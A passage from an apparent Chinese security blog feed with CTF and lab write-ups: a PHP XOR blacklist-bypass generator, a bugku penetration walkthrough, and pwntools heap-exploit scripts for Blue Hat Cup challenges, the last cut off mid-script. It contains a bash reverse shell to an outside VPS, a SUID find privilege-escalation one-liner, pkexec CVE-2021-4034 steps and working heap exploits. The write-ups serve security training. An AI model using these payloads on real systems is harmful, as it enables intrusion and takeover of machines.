class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>;      <span class="comment">// change</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span> &amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; : &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; ^ &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$c</span> == <span class="variable">$func</span>[<span class="variable">$func_idx</span>])&#123;</span><br><span class="line">                    <span class="variable">$func_idx</span>++;</span><br><span class="line">                    <span class="title function_ invoke__">array_push</span>(<span class="variable">$func_ary</span>, [<span class="variable">$c</span>, <span class="variable">$a</span>, <span class="variable">$b</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$xor1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$xor2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$func_ary</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$xor1</span> = <span class="variable">$xor1</span> . <span class="variable">$value</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$xor2</span> = <span class="variable">$xor2</span> . <span class="variable">$value</span>[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&quot;&quot;</span> . <span class="variable">$xor1</span> . <span class="string">&quot;\&quot;^\&quot;&quot;</span> . <span class="variable">$xor2</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>三目运算符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><ul>
<li><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，<strong>就是当[提前出现后，后面的点就不会再被转义了</strong>。</p>
</li>
<li><p><a href="https://www.php.net/manual/zh/language.operators.precedence.php">PHP: 运算符优先级 - Manual</a></p>
</li>
<li><p>关于php类中方法的调用，<code>-&gt;</code>用于动态语境处理某个类的某个实例，<code>::</code>调用静态的方法。</p>
</li>
<li><p>php中数字是可以和命令一起运算的，比如<code>1-phpinfo()-1</code>，实际上就是执行了<code>phpinfo()</code>。</p>
</li>
<li><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 渗透测试1</title>
    <url>/2023/09/23/Penetration/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/</url>
    <content><![CDATA[<h2 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h2><p>看页面源代码就能找到：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923131212171.png" alt="image-20230923131212171"></p>
<h2 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h2><p>根据提示访问&#x2F;admin试试看，找到登陆页面，尝试弱口令直接嗦admin&#x2F;admin，拿到管理员权限。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923131800470.png" alt="image-20230923131800470"></p>
<span id="more"></span>

<h2 id="场景3"><a href="#场景3" class="headerlink" title="场景3"></a>场景3</h2><p>尝试修改上传后缀上传木马，能够成功上传，但是似乎会将php代码注释成html返回给我们，失败。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923133456530.png" alt="image-20230923133456530"></p>
<p>在php教程发现将我们修改的代码上传成php文件，拿到shell和flag。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923134300445.png" alt="image-20230923134300445"></p>
<h2 id="场景4"><a href="#场景4" class="headerlink" title="场景4"></a>场景4</h2><p>提示root和数据库，那flag应该是在数据库里，想办法拿到root的数据库密码，尝试找数据库配置文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923134645069.png" alt="image-20230923134645069"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923135747972.png" alt="image-20230923135747972"></p>
<h2 id="场景5"><a href="#场景5" class="headerlink" title="场景5"></a>场景5</h2><p>看提示应该是要提权，看看suid提权无果，为什么是nc？看一看端口的连接情况。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923140110722.png" alt="image-20230923140110722"></p>
<p>发现一个9999端口挺奇怪的，nc连一下看看应该是提权的入口，况且没有显示进程说明很大可能是root开的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923140215429.png" alt="image-20230923140215429"></p>
<p>在ctf用户的目录下发现main文件，反编译分析就是需要pwn的文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923142143391.png" alt="image-20230923142143391"></p>
<h2 id="场景6、7"><a href="#场景6、7" class="headerlink" title="场景6、7"></a>场景6、7</h2><p>根据提示访问8080端口，发现是Shiro框架写的，抓个登录的包，发现deleteMe，工具嗦一下反序列化。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923144215117.png" alt="image-20230923144215117"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923144402245.png" alt="image-20230923144402245"></p>
<p>执行命令发现该机子的IP是192.168.0.3，应该是将服务转发到了外网机子的8080端口上。接下来找flag。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923144602680.png" alt="image-20230923144602680"></p>
<p>提交flag错误，场景6的flag应该在网站里面，源代码也没有，御剑扫一下，原来在robots.txt里面。</p>
<h2 id="场景8"><a href="#场景8" class="headerlink" title="场景8"></a>场景8</h2><p>接下来是提权拿root的flag，尝试suid提权。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923145511993.png" alt="image-20230923145511993"></p>
<p>现在VPS上反弹一个shell，<strong>记得VPS要开放端口</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xx.xxx/6666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://blog.csdn.net/crisprx/article/details/104110725">小记 SUID find提权_Crispr-bupt的博客-CSDN博客</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923150725164.png" alt="image-20230923150725164"></p>
<h2 id="场景9"><a href="#场景9" class="headerlink" title="场景9"></a>场景9</h2><p>VPS的终端看得太难受了，用frp穿透一下在kali里面拿一个终端。提示内网，fscan扫一下。</p>
<blockquote>
<p><a href="https://github.com/shadow1ng/fscan/releases">Releases · shadow1ng&#x2F;fscan · GitHub</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923155703517.png" alt="image-20230923155703517"></p>
<p>可以发现还有一个192.168.0.4的主机没有访问到，看title是一个博客。用Neo-reGeorg做一个代理。</p>
<blockquote>
<p><a href="https://github.com/L-codes/Neo-reGeorg">GitHub - L-codes&#x2F;Neo-reGeorg</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923160957037.png" alt="image-20230923160957037"></p>
<p>成功访问。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923161016215.png" alt="image-20230923161016215"></p>
<p>通过报错我们拿到了CMS：ThinkPHP V5.0.20</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923165930049.png" alt="image-20230923165930049"></p>
<p>直接上工具嗦，发现RCE，蚁剑拿下。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923173245697.png" alt="image-20230923173245697"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923173827975.png" alt="image-20230923173827975"></p>
<h2 id="场景10"><a href="#场景10" class="headerlink" title="场景10"></a>场景10</h2><p>根据提示在数据库里面，直接找配置文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923180135472.png" alt="image-20230923180135472"></p>
<p>发现蚁剑直接连不了，所以用frp做了一个端口的转发送到VPS上。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923181654268.png" alt="image-20230923181654268"></p>
<h2 id="场景11"><a href="#场景11" class="headerlink" title="场景11"></a>场景11</h2><p>尝试了一下本地漏洞扫描的脚本，扫出来的CVE也没能成功利用，直接看WP吧。</p>
<p>回头看来找suid的时候发现了<code>/usr/bin/pkexec</code>，这是不是也是一种提示呢。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923183605554.png" alt="image-20230923183605554"></p>
<blockquote>
<p><a href="https://github.com/berdav/CVE-2021-4034">GitHub - berdav&#x2F;CVE-2021-4034: CVE-2021-4034 1day</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1945253">CVE-2021-4034 polkit（pkexec）提权漏洞复现</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./cve-2021-4034</span><br></pre></td></tr></table></figure>

<p>注意一下直接在蚁剑里面做不成功，还是需要弹一个shell。</p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 蓝帽杯</title>
    <url>/2023/09/17/CTF/2023%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="takeway"><a href="#takeway" class="headerlink" title="takeway"></a>takeway</h4><p>题目比较简单。程序存在UAF，但是分配的次数太少了，所以第一次先改分配的次数并且泄露stdout的地址拿到libc的基地址，第二次直接打__free_hook就行。</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./takeway&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">sh = process(<span class="string">&quot;./takeway&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">sh = remote(<span class="string">&quot;&quot;</span>, )</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./takeway&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, name, remark</span>):</span><br><span class="line">sla(<span class="string">&quot;your choose: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;your order index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sa(<span class="string">&quot;your food name: &quot;</span>, name)</span><br><span class="line">sa(<span class="string">&quot;a remark: &quot;</span>, remark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">sla(<span class="string">&quot;your choose: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;your order index&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, name</span>):</span><br><span class="line">sla(<span class="string">&quot;your choose: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;input index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sa(<span class="string">&quot;New food name is: &quot;</span>, name)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x404080</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;pursue&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;your choose: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;input index: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">stdout = uu64()</span><br><span class="line">lg(<span class="string">&#x27;stdout&#x27;</span>)</span><br><span class="line">sa(<span class="string">&quot;New food name is: &quot;</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_base = stdout - libc.sym[<span class="string">&#x27;IO_2_1_stdout&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="string">b&#x27;\x00&#x27;</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="heapSpary"><a href="#heapSpary" class="headerlink" title="heapSpary"></a>heapSpary</h4><p>题目难道很大，比赛的时候是零解，但是赛后自己做出来了。首先分析逻辑就比较困难，主要看懂ADD功能，每次会进行16次堆块的分配，而且是利用随机数所以堆块的位置不确定，漏洞点是在ADD功能中向堆块写入内容没有进行长度限制，导致了堆溢出，但是很难受的是写入将末尾字符串改为空字符，导致泄露地址的难度大大增加。</p>
<p>如何泄露libc的地址，这里我是利用堆溢出构造堆叠，然后放入unsortedbin中，泄露了分割后更新的libc地址。如何拿到flag，根据action功能的作用，我们需要更改add功能写入堆中的flag标志（同时也需要用到堆叠），更改为一个地址，满足以下两个条件：<strong>一是该地址指向的值为0，二是该地址下一个地址指向的值为system的地址</strong>。所以我还分配了0x20000大小的堆块到libc附近，这样便于我们修改flag标志为可控的地址。最终实现的效果如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830132813143.png" alt="image-20230830132813143"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830132838157.png" alt="image-20230830132838157"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230830132850084.png" alt="image-20230830132850084"></p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># local = 2</span></span><br><span class="line"><span class="comment"># if local == 1 :</span></span><br><span class="line"><span class="comment"># 	sh = process([b&quot;./ld.so&quot;, b&quot;./main&quot;], env = &#123;&quot;LD_PRELOAD&quot; : b&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># elif local == 2 :</span></span><br><span class="line"><span class="comment">#     sh = process(&quot;./main&quot;)</span></span><br><span class="line"><span class="comment"># else :</span></span><br><span class="line"><span class="comment"># 	sh = remote(ip, port)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;tel $rebase(0x00004060) 0x20&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, head, flag</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choose : &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;do you need : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        sla(<span class="string">&#x27;your head data.\n&#x27;</span>, head[i])</span><br><span class="line">        sla(<span class="string">&#x27;do you want?&#x27;</span>, <span class="built_in">str</span>(flag[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choose : &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;heap index : &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sla(<span class="string">&#x27;your choose : &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choose : &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;heap index : &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line">            f = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">            l = [<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">            add(<span class="number">0x10</span>, l, f)</span><br><span class="line">            delete()</span><br><span class="line">            add(<span class="number">0x30</span>, l, f)</span><br><span class="line">            add(<span class="number">0x30</span>, l, f)</span><br><span class="line">            l = [<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line">            l.append(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1c</span> + p64(<span class="number">0x441</span>))</span><br><span class="line">            add(<span class="number">0x10</span>, l, f)</span><br><span class="line">            delete()</span><br><span class="line">            l = [<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">            add(<span class="number">0x30</span>, l, f)</span><br><span class="line"></span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> (j != <span class="number">16</span>):</span><br><span class="line">                show(j)</span><br><span class="line">                ru(<span class="string">&#x27;information is &#x27;</span>)</span><br><span class="line">                txt = ru(<span class="string">&#x27;========Welcome&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;\xf7&#x27;</span> <span class="keyword">in</span> txt:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">            libc_base = u32(txt.split(<span class="string">b&#x27;\xf7&#x27;</span>)[<span class="number">0</span>][-<span class="number">4</span>:] + <span class="string">b&#x27;\xf7&#x27;</span>) - <span class="number">0x22a7f8</span></span><br><span class="line">            lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            add(<span class="number">0x30</span>, l, f)</span><br><span class="line">            l = [(p32(<span class="number">0</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">            add(<span class="number">0x20000</span>, l, f)</span><br><span class="line">            l = [<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line">            l.append(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x6c</span> + p32(<span class="number">0xe1</span>))</span><br><span class="line">            add(<span class="number">0x60</span>, l, f)</span><br><span class="line">            delete()</span><br><span class="line">            l = [<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">            add(<span class="number">0x60</span>, l, f)</span><br><span class="line">            l = [(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0xd0</span> + p32(libc_base - <span class="number">0x20ff0</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">            add(<span class="number">0xd4</span>, l, f)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        action(<span class="number">83</span>)</span><br><span class="line">        </span><br><span class="line">        txt = sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(txt)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span 